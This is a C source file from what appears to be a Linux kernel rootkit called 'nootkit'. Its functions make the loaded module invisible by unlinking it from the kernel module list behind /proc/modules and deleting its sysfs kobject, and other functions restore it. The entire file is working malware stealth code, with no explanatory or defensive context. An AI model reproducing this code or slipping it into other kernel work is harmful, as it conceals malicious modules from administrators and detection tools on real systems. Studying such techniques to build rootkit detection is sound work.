#include <linux/module.h>
#include <linux/list.h>
#include <linux/sysfs.h>
#include <linux/kobject.h>

#include <hide.h>
#include <hook.h>
#include <ksyms.h>

static struct list_head *this_module_prev = NULL;
static bool hide_sys_module_enabled = false;

void hide_enable_thismodule(void)
{
    hide_enable_proc_module_this();
    hide_enable_sys_module_this();
}

void hide_disable_thismodule(void)
{
    hide_disable_proc_module_this();
    hide_disable_sys_module_this();
}

void hide_enable_proc_module_this(void)
{
    // only set if previously unset
    if (this_module_prev)
        return;
    // save prev module so we can re-add
    this_module_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void hide_disable_proc_module_this(void)
{
    // only unset if previously set
    if (!this_module_prev)
        return;
    list_add(&THIS_MODULE->list, this_module_prev);
    this_module_prev = NULL;
}

struct module_sect_attr {
    struct bin_attribute battr;
    unsigned long address;
};

struct module_sect_attrs {
    struct attribute_group grp;
    unsigned int nsections;
    struct module_sect_attr attrs[];
};

void hide_enable_sys_module_this(void)
{
    if (hide_sys_module_enabled)
        return;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    hide_sys_module_enabled = true;
}

void hide_disable_sys_module_this(void)
{
    if (!hide_sys_module_enabled)
        return;

    if (kobject_add(&THIS_MODULE->mkobj.kobj, NULL, THIS_MODULE->name))
        goto error;

    THIS_MODULE->holders_dir = kobject_create_and_add("holders",&THIS_MODULE->mkobj.kobj);
    if (sysfs_create_group(&THIS_MODULE->mkobj.kobj, &THIS_MODULE->sect_attrs->grp))
        goto error;

    kobject_put(&THIS_MODULE->mkobj.kobj);
    hide_sys_module_enabled = false;
    return;

error:
    printk(KERN_ERR "nootkit: Failed to recreate kobject and children");
}
 